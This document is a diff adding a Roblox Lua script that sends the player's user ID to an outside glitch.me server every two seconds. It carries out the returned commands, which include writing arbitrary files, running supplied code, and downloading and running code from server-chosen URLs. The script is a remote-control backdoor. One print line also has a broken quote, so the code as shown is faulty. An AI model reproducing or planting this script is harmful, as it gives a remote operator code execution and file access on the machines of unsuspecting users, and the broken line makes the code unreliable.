@@ -1,0 +1,45 @@
+local userfart = tostring(game:GetService("Players").LocalPlayer.UserId)
+
+spawn(function()
+	while true do
+		local success, result = pcall(function()
+			return game:GetService("HttpService"):JSONDecode(game:HttpGet("https://cheerful-aspiring-tungsten.glitch.me/poll/" .. userfart)) --heh.
+		end)
+
+		if success and typeof(result) == "table" then
+			for _, cmd in ipairs(result) do
+
+				if cmd.command == "print" then
+					print("tostring(cmd.args))
+
+				elseif cmd.command == "writefile" then
+					local args = cmd.args
+					if typeof(args) == "table" and args[1] and args[2] then
+						writefile(args[1], args[2])
+						print("wrote file: " .. args[1])
+					else
+						warn("invalid writefile args")
+					end
+
+				elseif cmd.command == "loadstring" then
+					local success, err = pcall(function()
+						loadstring(cmd.args)()
+					end)
+					if not success then
+						warn("loadstring error:", err)
+					end
+
+				elseif cmd.command == "hloadstring" then
+					local url = tostring(cmd.args)
+					local success, err = pcall(function()
+						loadstring(game:HttpGet(url))()
+					end)
+					if not success then
+						warn("hloadstring error:", err)
+					end
+				end
+			end
+		end
+		task.wait(2)
+	end
+end)
